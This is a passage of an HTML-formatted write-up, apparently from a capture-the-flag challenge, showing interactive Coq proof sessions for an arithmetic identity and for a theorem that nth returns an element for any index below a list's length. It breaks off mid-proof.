&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; mult_plus_distr_l&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; mult_plus_distr_l&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 17&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; plus_assoc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; plus_assoc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 19&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; plus_0_r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 20&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; firstorder&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;firstorder&lt;/code&gt; didn&#39;t work on my machine but worked on the server ¯\_(ツ)_/¯&lt;/p&gt;

&lt;p&gt;The final question took us a while:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;gj&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; now something more interesting&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; can you prove my code works&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;Require&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Import&lt;/span&gt; Le&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;Section&lt;/span&gt; last_stage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;Variable&lt;/span&gt; A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

  &lt;span style=&#34;color:#f92672&#34;&gt;Inductive&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; nil &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; cons &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;


  &lt;span style=&#34;color:#f92672&#34;&gt;Fixpoint&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; option A &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;l &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; cons x xs  &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; Some x
      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; S n&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; cons &lt;span style=&#34;color:#f92672&#34;&gt;_&lt;/span&gt; xs  &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; nth xs n
      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;_,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; None
    &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

  &lt;span style=&#34;color:#f92672&#34;&gt;Fixpoint&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt; l &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; nil &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; 0
      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; cons &lt;span style=&#34;color:#f92672&#34;&gt;_&lt;/span&gt; xs &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; 1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; length xs
    &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; nth_in&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;l&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The idea for this is induction on both &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;l&lt;/code&gt;. It should be easy for the base cases of &lt;code&gt;n&lt;/code&gt; is &lt;code&gt;0&lt;/code&gt;, or &lt;code&gt;l&lt;/code&gt; is &lt;code&gt;nil&lt;/code&gt;, and induction completes the rest of the proof.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;revert&lt;/span&gt; H&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;revert&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 15&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; l&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 19&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length nil &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth nil n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a

subgoal 2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 23&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
 n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inversion&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 23&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A
  l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
  IHl &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
  n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 50&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A
  l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
  IHl &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

subgoal 2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 53&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
 S n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;S n&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;simpl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 84&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
